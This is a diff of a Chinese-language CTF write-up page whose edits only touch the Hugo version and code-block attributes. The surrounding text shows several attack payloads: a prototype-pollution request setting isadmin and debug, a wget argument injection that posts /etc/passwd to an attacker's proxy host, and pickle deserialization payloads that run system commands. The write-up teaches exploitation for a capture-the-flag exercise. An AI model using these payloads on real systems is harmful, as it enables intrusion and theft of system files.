@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -276,7 +276,7 @@
 <p>由于package.json的版本声明以<code>^</code>开头，所以在npm install时会自动更新小版本，因此会导致lodash更新到没有该漏洞的版本，需要将lodash的<code>^</code>删掉指定版本下载</p>
 </blockquote>
 <p>然后就可以得到payload</p>
-<pre><code>username=tyskill&amp;password=tyskill&amp;&quot;].__proto__[&quot;isadmin=tyskill&amp;&quot;].__proto__[&quot;debug=tyskill
+<pre tabindex="0"><code>username=tyskill&amp;password=tyskill&amp;&quot;].__proto__[&quot;isadmin=tyskill&amp;&quot;].__proto__[&quot;debug=tyskill
 </code></pre><p>成功污染session的isadmin和debug之后就是之前的一个漏洞<a href="https://github.com/pugjs/pug/issues/3312" target="_blank" rel="noopener">https://github.com/pugjs/pug/issues/3312</a>，这也是为什么源码定义了pretty属性但没有使用的原因吧</p>
 <p>exp</p>
 <div class="highlight"><div class="chroma">
@@ -366,9 +366,9 @@
 </code></pre></td></tr></table></div>
 </div>
 </div><p>输入有两个，wget参数和图片地址，图片地址没办法目录穿越，只能依靠wget参数作为入口点，通过代理获得文件流数据</p>
-<pre><code>/images?image=&amp;argv=--post-file=/etc/passwd&amp;argv=--execute=http_proxy=http://IP
+<pre tabindex="0"><code>/images?image=&amp;argv=--post-file=/etc/passwd&amp;argv=--execute=http_proxy=http://IP
 </code></pre><p>然后就可以得到一些文件，接下来就是审计工作，看名字也知道是pickle反序列化，直接上<a href="https://github.com/EddieIvan01/pker" target="_blank" rel="noopener">pker</a></p>
-<pre><code>s=GLOBAL(&quot;config&quot;,&quot;notadmin&quot;)
+<pre tabindex="0"><code>s=GLOBAL(&quot;config&quot;,&quot;notadmin&quot;)
 s[&quot;admin&quot;]=&quot;yes&quot;
 user=INST(&quot;config&quot;,&quot;user&quot;)
 user.username=&quot;tyskill&quot;
@@ -505,7 +505,7 @@ return user
 </code></pre></td></tr></table></div>
 </div>
 </div><p>通过审计代码可以发现它定义了一个反序列化的模块限制，但是限制函数并没有使用，所以它定义了个寂寞。因此整个代码仅有的过滤就是<code>R</code>字符，参考<a href="https://eustiar.com/archives/673" target="_blank" rel="noopener">https://eustiar.com/archives/673</a>可以知道在无<code>R</code>下的RCE姿势：（还记了一种覆盖式的RCE这里不讨论，用不上）</p>
-<pre><code>\x80\x03(S'ls'\nios\nsystem\n.
+<pre tabindex="0"><code>\x80\x03(S'ls'\nios\nsystem\n.
 \x80\x03(cos\nsystem\nS'whoami'\no.
 </code></pre><p>这里不要盲目的使用payload，因为它pickle反序列化使用的是0号协议，该协议有什么特点呢？自己本地dumps一遍就知道了，然后就可以发现文章给的payload是3号协议的，所以我们需要修改，直接把<code>\x80\x03</code>删了就行。接下来就是payload一把梭了（不像what_pickle没给curl，这道题真TM友好）</p>
 <p>exp</p>
